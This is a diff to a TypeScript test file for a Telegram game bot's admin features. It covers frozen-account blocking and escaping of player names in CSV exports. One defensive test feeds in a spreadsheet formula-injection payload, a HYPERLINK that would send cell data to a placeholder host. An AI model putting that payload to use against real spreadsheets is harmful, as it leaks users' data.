@@ -3,13 +3,14 @@ import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { botWith } from './routes/bot.js';
 import { save } from './routes/save.js';
 import { war } from './routes/war.js';
+import { gems } from './routes/gems.js';
 import { reportWith } from './routes/report.js';
 import { STORES, type Kv, type Stores } from './kv.js';
 import type { Telegram } from './telegram.js';
 import { FROZEN_ORDER, adminIds, grantsKey, readAdminLog, readFrozen, readGrants } from './admin.js';
-import { kindOf, parseGive, statsCsv } from './commands.js';
+import { cell, kindOf, parseGive, statsCsv } from './commands.js';
 import { readWatchRecord, flagsBetween, flagsOf } from './watch.js';
-import { REPORT_LIMITS, readAdminNote, readGrant, type WatchCard } from './contract.js';
+import { GEM_GOODS, REPORT_LIMITS, readAdminNote, readGrant, type WatchCard } from './contract.js';
 
 /**
  * Админка (docs/admin.md). Тесты там, где без них можно открыть админку чужому, начислить из ничего или потерять
@@ -312,6 +313,23 @@ describe('заморозка', () => {
     );
     expect(((await order.json()) as { error?: string }).error).toBe(FROZEN_ORDER);
 
+    // Алмазы и лазутчик — тоже приказы: замороженный их не отдаёт, книга алмазов не тронута.
+    const gemsAt = (body: unknown, now: number) =>
+      gems(new Request('https://x/api/gems', { method: 'POST', headers: { 'x-telegram-init-data': signInit(7002) }, body: JSON.stringify(body) }), {
+        stores: s.stores,
+        now,
+        ip: null,
+      });
+    const bought = (await (await gemsAt({ op: 'buy', key: 'frozen-buy-1', res: GEM_GOODS[0] }, NOW + 63_000)).json()) as { error?: string; entry?: unknown };
+    expect(bought.error).toBe(FROZEN_ORDER);
+    expect(bought.entry).toBeUndefined();
+    const spy = await war(new Request('https://x/api/war?spy=c0000000000000', { headers: { 'x-telegram-init-data': signInit(7002) } }), {
+      stores: s.stores,
+      now: NOW + 64_000,
+      ip: null,
+    });
+    expect(((await spy.json()) as { error?: string }).error).toBe(FROZEN_ORDER);
+
     expect(await command(s, t, ADMIN, '/unfreeze 7002')).toMatch(/разморожен/);
     const again = await saveCall(s, 'PUT', { baseEtag: first.body.etag, record: record(card()) }, NOW + 120_000, 7002);
     expect(again.status).toBe(200);
@@ -430,5 +448,22 @@ describe('/stats — файл CSV', () => {
     expect(rows[1].split(';')[0]).toBe('7004');
     expect(rows[1]).toMatch(/Новгород/);
     expect(statsCsv([], { v: 1, keys: {} }).trim().split('\r\n')).toHaveLength(1);
+  });
+});
+
+describe('/stats: имя игрока не становится формулой в таблице админа (docs/bughunt.md, «Формула в /stats»)', () => {
+  it('строка, начатая знаком формулы, получает апостроф; кавычки по-прежнему удваиваются', () => {
+    expect(cell('=1+1')).toBe("'=1+1");
+    expect(cell('+7 999')).toBe("'+7 999");
+    expect(cell('-1')).toBe("'-1");
+    expect(cell('@x')).toBe("'@x");
+    expect(cell('=HYPERLINK("http://x.example/?"&A2;"Жми")')).toBe(`"'=HYPERLINK(""http://x.example/?""&A2;""Жми"")"`);
+  });
+
+  it('обычные имена и числа — как были: минус у числа свой', () => {
+    expect(cell('Новгород')).toBe('Новгород');
+    expect(cell('Город; с точкой')).toBe('"Город; с точкой"');
+    expect(cell(-5)).toBe('-5');
+    expect(cell(0)).toBe('0');
   });
 });
